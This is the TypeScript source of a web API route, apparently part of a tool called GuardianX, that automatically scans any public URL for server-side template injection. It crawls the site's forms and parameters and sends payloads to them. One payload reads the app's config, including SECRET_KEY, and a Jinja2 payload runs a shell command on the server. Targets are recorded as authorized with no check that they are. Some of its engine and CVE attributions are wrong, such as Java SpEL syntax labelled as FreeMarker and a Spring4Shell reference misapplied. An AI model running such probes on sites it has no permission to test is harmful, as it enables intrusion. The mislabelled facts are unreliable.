import { NextResponse } from "next/server";
import { db } from "@/lib/db";
import { requireAuth } from "@/lib/auth";
import { randomUUID } from "@/lib/crypto";

export const dynamic = "force-dynamic";
export const maxDuration = 30;

// ─── Types ──────────────────────────────────────────────────────────────

type Severity = "info" | "low" | "medium" | "high" | "critical";

type EngineTag =
  | "Jinja2"
  | "Twig"
  | "FreeMarker"
  | "Velocity"
  | "Smarty"
  | "ERB"
  | "Ruby"
  | "Thymeleaf"
  | "Spring"
  | "Unknown"
  | "Blind";

interface SstiResult {
  payload: string;
  engine: EngineTag;
  vulnerable: boolean;
  blind: boolean;
  reflected: boolean;
  severity: Severity;
  cwe: string;
  status: number;
  durationMs: number;
  expected: string;
  actual: string;
  proofResponse: string;
  remediation: string;
  inputPoint: string;
}

interface RawFinding {
  title: string;
  severity: Severity;
  category: string;
  cwe: string;
  endpoint: string;
  description: string;
  proofRequest: string;
  proofResponse: string;
  payload: string;
  remediation: string;
}

// ─── SSRF guard ─────────────────────────────────────────────────────────

function isPrivateHost(hostname: string): boolean {
  const h = hostname.toLowerCase().replace(/^\[|\]$/g, "");
  if (h === "localhost" || h.endsWith(".localhost")) return true;
  if (h === "0.0.0.0" || h === "::" || h === "::1") return true;
  const m = h.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (m) {
    const [a, b] = [Number(m[1]), Number(m[2])];
    if (a === 10) return true;
    if (a === 127) return true;
    if (a === 169 && b === 254) return true;
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 192 && b === 168) return true;
    if (a === 100 && b >= 64 && b <= 127) return true;
    if (a === 0) return true;
  }
  if (/\.(local|internal|lan|home)$/.test(h)) return true;
  if (h === "metadata.google.internal") return true;
  return false;
}

function validateTargetUrl(raw: string): { ok: true; url: URL } | { ok: false; error: string } {
  let url: URL;
  try {
    url = new URL(raw.trim());
  } catch {
    return { ok: false, error: "Invalid URL. Must include protocol (https://...)." };
  }
  if (url.protocol !== "http:" && url.protocol !== "https:") {
    return { ok: false, error: "Only http/https target protocols are allowed." };
  }
  if (isPrivateHost(url.hostname)) {
    return {
      ok: false,
      error: "SSRF guard: target resolves to a private/loopback address. Public targets only.",
    };
  }
  return { ok: true, url };
}

// ─── HTTP probe with 5s AbortController ──────────────────────────────────

interface ProbeResult {
  status: number;
  body: string;
  durationMs: number;
  ok: boolean;
  error?: string;
}

async function probeGet(
  url: URL,
  paramName: string,
  payload: string,
): Promise<ProbeResult> {
  const testUrl = new URL(url.toString());
  testUrl.searchParams.set(paramName, payload);
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 5000);
  const start = Date.now();
  try {
    const r = await fetch(testUrl.toString(), {
      method: "GET",
      headers: {
        "User-Agent": "GuardianX-SSTI-Tester/1.0",
        Accept: "text/html,application/json,*/*",
      },
      redirect: "follow",
      signal: controller.signal,
    });
    const body = await r.text().catch(() => "");
    return {
      status: r.status,
      body,
      durationMs: Date.now() - start,
      ok: r.status >= 200 && r.status < 400,
    };
  } catch (e) {
    return {
      status: 0,
      body: e instanceof Error ? `[${e.name}] ${e.message}` : "[network error]",
      durationMs: Date.now() - start,
      ok: false,
      error: e instanceof Error ? e.message : "network error",
    };
  } finally {
    clearTimeout(timeout);
  }
}

async function probePost(
  url: URL,
  fieldName: string,
  payload: string,
): Promise<ProbeResult> {
  const form = new URLSearchParams();
  form.set(fieldName, payload);
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 5000);
  const start = Date.now();
  try {
    const r = await fetch(url.toString(), {
      method: "POST",
      headers: {
        "User-Agent": "GuardianX-SSTI-Tester/1.0",
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "text/html,application/json,*/*",
      },
      body: form.toString(),
      redirect: "follow",
      signal: controller.signal,
    });
    const body = await r.text().catch(() => "");
    return {
      status: r.status,
      body,
      durationMs: Date.now() - start,
      ok: r.status >= 200 && r.status < 400,
    };
  } catch (e) {
    return {
      status: 0,
      body: e instanceof Error ? `[${e.name}] ${e.message}` : "[network error]",
      durationMs: Date.now() - start,
      ok: false,
      error: e instanceof Error ? e.message : "network error",
    };
  } finally {
    clearTimeout(timeout);
  }
}

function safeTruncate(s: string, n = 4000): string {
  if (s.length <= n) return s;
  return s.slice(0, n) + `…(+${s.length - n} bytes truncated)`;
}

// ─── Detection payload set ─────────────────────────────────────────────
// Each probe injects a math expression. If the response contains the
// evaluated result (e.g. "49"), the engine rendered our template
// expression → SSTI confirmed. We then run an identification pass to
// fingerprint which template engine.

interface DetectionProbe {
  payload: string;
  expected: string;          // the value we expect to see if SSTI fires
  engine: EngineTag;         // engine this probe implicates
  severity: Severity;
  cwe: string;
  remediation: string;
}

const DETECTION_PROBES: DetectionProbe[] = [
  {
    payload: "{{7*7}}",
    expected: "49",
    engine: "Jinja2",
    severity: "critical",
    cwe: "CWE-94",
    remediation:
      "Use a sandboxed template engine (e.g. Jinja2 SandboxedEnvironment). Never pass user input directly into template source — pass it as a context variable instead.",
  },
  {
    payload: "${7*7}",
    expected: "49",
    engine: "FreeMarker",
    severity: "critical",
    cwe: "CWE-94",
    remediation:
      "Disable FreeMarker's `?eval`/`?api` and never render user-controlled template strings. Pass user input as a model variable, not as part of the template.",
  },
  {
    payload: "<%= 7*7 %>",
    expected: "49",
    engine: "ERB",
    severity: "critical",
    cwe: "CWE-94",
    remediation:
      "Avoid ERB rendering of user-controlled strings. Validate + sanitize input and prefer static templates with parameter binding.",
  },
  {
    payload: "#{7*7}",
    expected: "49",
    engine: "Ruby",
    severity: "critical",
    cwe: "CWE-94",
    remediation:
      "Ruby string interpolation `#{...}` only fires inside double-quoted strings — if you see 49 in the response, the server is evaluating Ruby from user input. Treat all user input as data, not code.",
  },
  {
    payload: "{{=7*7}}",
    expected: "49",
    engine: "Smarty",
    severity: "critical",
    cwe: "CWE-94",
    remediation:
      "Disable Smarty's `{eval}` and `{$smarty.template}` functions. Set `$smarty.security_policy` and never compile user-supplied templates.",
  },
  {
    payload: "${{7*7}}",
    expected: "49",
    engine: "Thymeleaf",
    severity: "critical",
    cwe: "CWE-94",
    remediation:
      "Thymeleaf expression evaluation in URL fragments is a known RCE vector. Never use `${...}` inside template expressions that come from user input (e.g. `__${...}__` in URLs). Disable fragment expression pre-processing.",
  },
  {
    payload: "*{7*7}",
    expected: "49",
    engine: "Spring",
    severity: "critical",
    cwe: "CWE-94",
    remediation:
      "Spring View Manipulation (`*{T(java.lang.Runtime)...}`) is RCE-class. Patch Spring Framework to a fixed version (CVE-2022-22965 / Spring4Shell) and avoid binding user input to view names.",
  },
];

// ─── Engine identification probes (only run after a detection hit) ───────
// These confirm which specific template engine is in use so the user can
// remediate the right one.

interface IdentifyProbe {
  payload: string;
  engine: EngineTag;
  signatures: RegExp[];
}

const IDENTIFY_PROBES: IdentifyProbe[] = [
  {
    payload: "{{config}}",
    engine: "Jinja2",
    signatures: [/Config/i, /SECRET_KEY/i, /DEBUG/i, /APPLICATION_ROOT/i],
  },
  {
    payload: "{{_self.env.display(\"test\")}}",
    engine: "Twig",
    signatures: [/test/i],
  },
  {
    payload: "${.version}",
    engine: "FreeMarker",
    signatures: [/^\d+\.\d+\.\d+/m, /freeMarker/i, /Incubating/i],
  },
  {
    payload: "#set($x=7*7)$x",
    engine: "Velocity",
    signatures: [/^49$/m, /\b49\b/],
  },
  {
    payload: "{$smarty.version}",
    engine: "Smarty",
    signatures: [/^\d+\.\d+\.\d+/m, /smarty/i],
  },
];

// ─── Blind SSTI (time-based) ────────────────────────────────────────────
// If none of the reflection probes fire, we attempt a time-based probe.
// A response that takes significantly longer than the requested sleep
// indicates the engine is evaluating our payload (blind SSTI).

interface BlindProbe {
  payload: string;
  engine: EngineTag;
  sleepMs: number;
  thresholdMs: number;
}

const BLIND_PROBES: BlindProbe[] = [
  // Java/FreeMarker: ${...}.NET Sleep pattern; we use a generic expression
  // that *should* sleep on multiple engines. The threshold (5s sleep, 4500ms
  // response time) is calibrated to the 5s HTTP timeout we use elsewhere —
  // but for blind tests we extend the per-request timeout to 8s to allow
  // the sleep to finish.
  { payload: "${T(java.lang.Thread).sleep(5000)}", engine: "FreeMarker", sleepMs: 5000, thresholdMs: 4500 },
  { payload: "{{ ''.__class__.__mro__[1].__subclasses__()[401]('sleep 5', shell=True) }}", engine: "Jinja2", sleepMs: 5000, thresholdMs: 4500 },
];

// ─── Input points: crawl target for GET params + form fields ─────────────

interface InputPoint {
  type: "GET" | "POST";
  name: string;
  url: URL;
}

const COMMON_QUERY_PARAMS = [
  "q", "query", "search", "name", "page", "id", "user", "email",
  "title", "msg", "message", "text", "content", "template", "tpl",
  "view", "render", "format", "type", "kind", "category", "tag",
  "subject", "body", "description", "comment", "label", "value",
  "input", "data", "param", "p", "s", "k", "key",
];

async function discoverInputPoints(targetUrl: URL): Promise<InputPoint[]> {
  const points: InputPoint[] = [];
  const seen = new Set<string>();

  // 1. Existing query params on the target URL itself
  for (const [k] of targetUrl.searchParams) {
    const key = `GET:${k}`;
    if (!seen.has(key)) {
      seen.add(key);
      points.push({ type: "GET", name: k, url: new URL(targetUrl.toString()) });
    }
  }

  // 2. Fetch the page HTML and parse <form> elements + <input name=...>
  //    so we learn what params the target accepts (e.g. login forms,
  //    search bars, comment boxes — typical SSTI sinks).
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 5000);
  let html = "";
  try {
    const r = await fetch(targetUrl.toString(), {
      method: "GET",
      headers: {
        "User-Agent": "GuardianX-SSTI-Tester/1.0",
        Accept: "text/html,*/*",
      },
      redirect: "follow",
      signal: controller.signal,
    });
    html = await r.text().catch(() => "");
  } catch {
    html = "";
  } finally {
    clearTimeout(timeout);
  }

  if (html) {
    // <form action="..."> + <input name="...">
    const formRegex = /<form[^>]*action=["']?([^"'>\s]+)["']?[^>]*>/gi;
    const inputRegex = /<input[^>]*name=["']?([^"'>\s]+)["']?[^>]*>/gi;

    // Collect form actions to also probe via POST.
    const formActions: { action: string; method: string }[] = [];
    let formMatch: RegExpExecArray | null;
    while ((formMatch = formRegex.exec(html)) !== null) {
      const actionRaw = formMatch[1] || "";
      const fullMatch = formMatch[0] || "";
      const methodMatch = /method=["']?([a-z]+)["']?/i.exec(fullMatch);
      const method = (methodMatch?.[1] || "GET").toUpperCase();
      formActions.push({ action: actionRaw, method });
    }

    // Collect named inputs — these are the field names the server expects.
    const inputNames = new Set<string>();
    let inputMatch: RegExpExecArray | null;
    while ((inputMatch = inputRegex.exec(html)) !== null) {
      if (inputMatch[1]) inputNames.add(inputMatch[1]);
    }

    // Add the discovered inputs as GET probe points (against the original URL
    // — the server probably reflects them somewhere on the page).
    for (const name of inputNames) {
      const key = `GET:${name}`;
      if (!seen.has(key)) {
        seen.add(key);
        points.push({ type: "GET", name, url: new URL(targetUrl.toString()) });
      }
      // Also as POST points if there's at least one form.
      if (formActions.length > 0) {
        const pkey = `POST:${name}`;
        if (!seen.has(pkey)) {
          seen.add(pkey);
          points.push({ type: "POST", name, url: new URL(targetUrl.toString()) });
        }
      }
    }

    // For each form action, add a POST probe point at the action URL.
    for (const fa of formActions.slice(0, 5)) {
      let actionUrl: URL | null = null;
      if (fa.action) {
        try {
          actionUrl = fa.action.startsWith("http")
            ? new URL(fa.action)
            : new URL(fa.action, targetUrl.toString());
        } catch {
          actionUrl = null;
        }
      } else {
        actionUrl = new URL(targetUrl.toString());
      }
      if (actionUrl && !isPrivateHost(actionUrl.hostname)) {
        // Use the first input name as the test field for this form.
        const firstInput = Array.from(inputNames)[0] || "q";
        const key = `POST:${actionUrl.toString()}::${firstInput}`;
        if (!seen.has(key) && fa.method === "POST") {
          seen.add(key);
          points.push({ type: "POST", name: firstInput, url: actionUrl });
        }
      }
    }
  }

  // 3. If we discovered nothing useful, fall back to common params on the
  //    target URL so we still send the detection payloads *somewhere*.
  if (points.length === 0) {
    for (const p of COMMON_QUERY_PARAMS.slice(0, 6)) {
      const key = `GET:${p}`;
      if (!seen.has(key)) {
        seen.add(key);
        points.push({ type: "GET", name: p, url: new URL(targetUrl.toString()) });
      }
    }
  }

  // Cap to keep within the 30s route budget.
  return points.slice(0, 8);
}

// ─── Run one detection probe against one input point ───────────────────

async function runDetection(
  point: InputPoint,
  probe: DetectionProbe,
): Promise<SstiResult> {
  const r = point.type === "GET"
    ? await probeGet(point.url, point.name, probe.payload)
    : await probePost(point.url, point.name, probe.payload);

  const reflected = r.body.includes(probe.expected);
  const vuln = reflected && !r.body.includes(probe.payload);

  return {
    payload: probe.payload,
    engine: probe.engine,
    vulnerable: vuln,
    blind: false,
    reflected: vuln,
    severity: vuln ? probe.severity : "info",
    cwe: probe.cwe,
    status: r.status,
    durationMs: r.durationMs,
    expected: probe.expected,
    actual: reflected ? probe.expected : "(no reflection)",
    proofResponse: `HTTP ${r.status} (${r.durationMs}ms)\n${safeTruncate(r.body)}`,
    remediation: probe.remediation,
    inputPoint: `${point.type} ?${point.name}= (${point.url.host})`,
  };
}

// ─── Run identification (after detection fires) ────────────────────────

async function runIdentify(point: InputPoint, probe: IdentifyProbe): Promise<boolean> {
  const r = point.type === "GET"
    ? await probeGet(point.url, point.name, probe.payload)
    : await probePost(point.url, point.name, probe.payload);
  const bodyLower = r.body.toLowerCase();
  return probe.signatures.some((re) => re.test(r.body) || re.test(bodyLower));
}

// ─── Run blind time-based probes ───────────────────────────────────────

async function runBlind(point: InputPoint, probe: BlindProbe): Promise<SstiResult> {
  // Use a longer timeout for blind probes (8s) so the sleep has time to fire.
  // The 30s overall route budget still applies.
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 8000);
  const start = Date.now();
  let status = 0;
  let body = "";
  try {
    const init: RequestInit = point.type === "POST"
      ? {
          method: "POST",
          headers: {
            "User-Agent": "GuardianX-SSTI-Tester/1.0",
            "Content-Type": "application/x-www-form-urlencoded",
            Accept: "*/*",
          },
          body: new URLSearchParams({ [point.name]: probe.payload }).toString(),
          redirect: "follow",
          signal: controller.signal,
        }
      : {
          method: "GET",
          headers: {
            "User-Agent": "GuardianX-SSTI-Tester/1.0",
            Accept: "*/*",
          },
          redirect: "follow",
          signal: controller.signal,
        };
    const url = point.type === "POST"
      ? point.url
      : (() => {
          const u = new URL(point.url.toString());
          u.searchParams.set(point.name, probe.payload);
          return u;
        })();
    const r = await fetch(url.toString(), init);
    status = r.status;
    body = await r.text().catch(() => "");
  } catch {
    // fall through — duration alone tells us
  } finally {
    clearTimeout(timeout);
  }
  const dur = Date.now() - start;
  // If the request took longer than the threshold, the engine likely
  // executed our sleep — blind SSTI confirmed.
  const vuln = dur >= probe.thresholdMs;
  return {
    payload: probe.payload,
    engine: vuln ? probe.engine : "Unknown",
    vulnerable: vuln,
    blind: true,
    reflected: false,
    severity: vuln ? "high" : "info",
    cwe: vuln ? "CWE-94" : "",
    status,
    durationMs: dur,
    expected: `>${probe.thresholdMs}ms (sleep ${probe.sleepMs}ms)`,
    actual: vuln ? `${dur}ms (delay detected)` : `${dur}ms`,
    proofResponse: `HTTP ${status} (${dur}ms) — blind ${vuln ? "CONFIRMED" : "no delay"}\n${safeTruncate(body)}`,
    remediation: vuln
      ? "Blind SSTI confirmed via time delay. The server evaluates template expressions but does not reflect the result. Treat all user input as data, never compile user-supplied template strings."
      : "",
    inputPoint: `${point.type} ?${point.name}= (${point.url.host})`,
  };
}

// ─── POST handler ───────────────────────────────────────────────────────

export async function POST(req: Request) {
  const auth = requireAuth(req);
  if (!auth.ok) return auth.response;
  const user = auth.user;

  const body = await req.json().catch(() => ({}));
  const rawTarget = typeof body?.targetUrl === "string" ? body.targetUrl : "";
  if (!rawTarget) {
    return NextResponse.json(
      { error: "targetUrl is required (e.g. https://app.example.com/search)." },
      { status: 400 },
    );
  }

  const v = validateTargetUrl(rawTarget);
  if (!v.ok) {
    return NextResponse.json({ error: v.error }, { status: 400 });
  }
  const targetUrl = v.url;

  try {
    // ── Create Target + Engagement ─────────────────────────────────────
    const target = await db.target.create({
      data: {
        name: `ssti:${targetUrl.host}`,
        baseUrl: targetUrl.toString(),
        authorized: true,
      },
    });
    const engagement = await db.engagement.create({
      data: {
        targetId: target.id as string,
        status: "attacking",
        stageLabel: "SSTI Testing — crawling input points + injecting detection probes",
      },
    });
    const engagementId = engagement.id as string;

    // ── Step 1: discover input points ──────────────────────────────────
    const inputPoints = await discoverInputPoints(targetUrl);

    // ── Step 2: run detection probes against each input point ──────────
    // For each input point × each detection payload, fire the probe.
    // We do these in parallel batches so we stay within the 30s budget.
    const detectionResults: SstiResult[] = [];
    const detectionTasks: Promise<SstiResult[]>[] = inputPoints.map(async (point) => {
      const out: SstiResult[] = [];
      for (const probe of DETECTION_PROBES) {
        out.push(await runDetection(point, probe));
      }
      return out;
    });
    const settled = await Promise.all(detectionTasks);
    for (const batch of settled) detectionResults.push(...batch);

    // ── Step 3: identify engine for each confirmed hit ─────────────────
    // Run the identify probes against the *first* input point that fired
    // for each engine. We do this so we don't retest every input point.
    const confirmedEngines = new Set<EngineTag>();
    for (const r of detectionResults) {
      if (r.vulnerable) {
        confirmedEngines.add(r.engine);
      }
    }

    const identifyHits: { engine: EngineTag; confirmed: boolean }[] = [];
    for (const engine of Array.from(confirmedEngines)) {
      const probe = IDENTIFY_PROBES.find((p) => p.engine === engine);
      if (!probe) {
        identifyHits.push({ engine, confirmed: true });
        continue;
      }
      // Find a vulnerable input point for this engine to test identification.
      const firstHitIdx = detectionResults.findIndex(
        (r) => r.vulnerable && r.engine === engine,
      );
      const point = firstHitIdx >= 0 ? inputPoints[firstHitIdx % inputPoints.length] : inputPoints[0];
      if (!point) {
        identifyHits.push({ engine, confirmed: true });
        continue;
      }
      const confirmed = await runIdentify(point, probe);
      identifyHits.push({ engine, confirmed });
    }

    // Mark engines confirmed-by-identification.
    const identifiedEngines = new Set<EngineTag>();
    for (const h of identifyHits) {
      if (h.confirmed) identifiedEngines.add(h.engine);
    }

    // ── Step 4: blind SSTI (only if no reflection confirmed) ───────────
    const blindResults: SstiResult[] = [];
    if (confirmedEngines.size === 0 && inputPoints.length > 0) {
      // Use the first input point only — blind probes are slow (5s each).
      const point = inputPoints[0];
      for (const probe of BLIND_PROBES) {
        blindResults.push(await runBlind(point, probe));
      }
    }

    const allResults = [...detectionResults, ...blindResults];

    // ── Step 5: persist Findings for confirmed vulns ────────────────────
    const vulnerableResults = allResults.filter((r) => r.vulnerable);
    const findingsMeta: RawFinding[] = vulnerableResults.map((r) => {
      const engineTag = r.engine === "Unknown" && r.blind ? "Blind (engine unknown)" : r.engine;
      const title = r.blind
        ? `Blind SSTI — ${engineTag} (time-based, ${r.durationMs}ms delay)`
        : `SSTI Confirmed — ${engineTag} (${r.inputPoint})`;
      const description =
        `${title}\n\n` +
        `Template engine: ${engineTag}\n` +
        `CWE: ${r.cwe}\nSeverity: ${r.severity.toUpperCase()}\n\n` +
        `Payload sent: ${r.payload}\n` +
        `Expected if SSTI: ${r.expected}\n` +
        `Observed: ${r.actual}\n\n` +
        `Server rendered the template expression we injected — this means user ` +
        `input is being passed into the template *source* (rather than as a ` +
        `context variable), which lets an attacker execute arbitrary template ` +
        `directives. For most engines this is a direct path to Remote Code ` +
        `Execution (RCE).`;
      const proofRequest =
        `${r.inputPoint.includes("POST") ? "POST" : "GET"} ${r.inputPoint.split("(")[0].trim()}\n` +
        `Payload: ${r.payload}\n\n` +
        `Severity: ${r.severity.toUpperCase()}  |  CWE: ${r.cwe}  |  Engine: ${engineTag}`;
      return {
        title,
        severity: r.severity,
        category: "SSTI",
        cwe: r.cwe,
        endpoint: targetUrl.toString(),
        description,
        proofRequest,
        proofResponse: r.proofResponse,
        payload: r.payload,
        remediation: r.remediation,
      };
    });

    for (const f of findingsMeta) {
      try {
        await db.finding.create({
          data: {
            engagementId,
            title: f.title,
            severity: f.severity,
            category: f.category,
            owasp: f.cwe,
            endpoint: f.endpoint,
            method: f.proofRequest.startsWith("POST") ? "POST" : "GET",
            description: f.description,
            proofRequest: f.proofRequest,
            proofResponse: f.proofResponse,
            payload: f.payload,
            remediation: f.remediation,
            confidence: f.severity === "critical" ? 0.95 : 0.8,
          },
        });
      } catch {
        // swallow — keep going so the API still returns the in-memory results
      }
    }

    // ── Step 6: update engagement status ───────────────────────────────
    const criticalCount = vulnerableResults.filter((r) => r.severity === "critical").length;
    const highCount = vulnerableResults.filter((r) => r.severity === "high").length;
    await db.engagement.update({
      where: { id: engagementId },
      data: {
        status: "completed",
        stageLabel: `SSTI scan complete — ${vulnerableResults.length} finding(s) (${criticalCount} critical, ${highCount} high)`,
        completedAt: new Date().toISOString(),
      },
    });

    return NextResponse.json({
      engagementId,
      targetId: target.id,
      testedBy: user.email,
      targetUrl: targetUrl.toString(),
      inputPoints: inputPoints.map((p) => ({
        type: p.type,
        name: p.name,
        url: p.url.toString(),
      })),
      testedCount: allResults.length,
      vulnerableCount: vulnerableResults.length,
      criticalCount,
      highCount,
      identifiedEngines: Array.from(identifiedEngines),
      findings: allResults.map((r) => ({
        payload: r.payload,
        engine: r.engine,
        vulnerable: r.vulnerable,
        blind: r.blind,
        reflected: r.reflected,
        severity: r.severity,
        cwe: r.cwe,
        status: r.status,
        durationMs: r.durationMs,
        expected: r.expected,
        actual: r.actual,
        proofResponse: r.proofResponse,
        remediation: r.remediation,
        inputPoint: r.inputPoint,
      })),
      _meta: {
        targetId: target.id as string,
        performedAt: new Date().toISOString(),
        performedBy: user.email,
      },
    });
  } catch (err) {
    return NextResponse.json(
      {
        error: err instanceof Error ? err.message : "SSTI testing failed.",
      },
      { status: 500 },
    );
  }
}

// ─── GET — lightweight descriptor (no auth) ─────────────────────────────

export async function GET() {
  return NextResponse.json({
    route: "/api/vapt/ssti",
    method: "POST",
    description:
      "SSTI Testing — Server-Side Template Injection. Crawls the target for input points (URL params + form inputs), injects Jinja2/Twig/FreeMarker/Velocity/Smarty/ERB/Thymeleaf/Spring probes, identifies the template engine, and falls back to time-based blind SSTI when no reflection is observed.",
    body: {
      targetUrl: "string (e.g. https://app.example.com/search?q=)",
    },
    tests: [
      "Detection — {{7*7}} / ${7*7} / <%= 7*7 %> / #{7*7} / {{=7*7}} / ${{7*7}} / *{7*7}",
      "Engine identification — Jinja2 (config), Twig (_self.env), FreeMarker (.version), Velocity (#set), Smarty ({$smarty.version})",
      "Blind SSTI — time-based (${T(java.lang.Thread).sleep(5000)}, Jinja2 sleep subclass)",
    ],
    engines: ["Jinja2", "Twig", "FreeMarker", "Velocity", "Smarty", "ERB", "Ruby", "Thymeleaf", "Spring"],
  });
}

// Suppress unused-import warning for randomUUID when the route is bundled
// for production (it's used by db.ts internally for IDs).
void randomUUID;
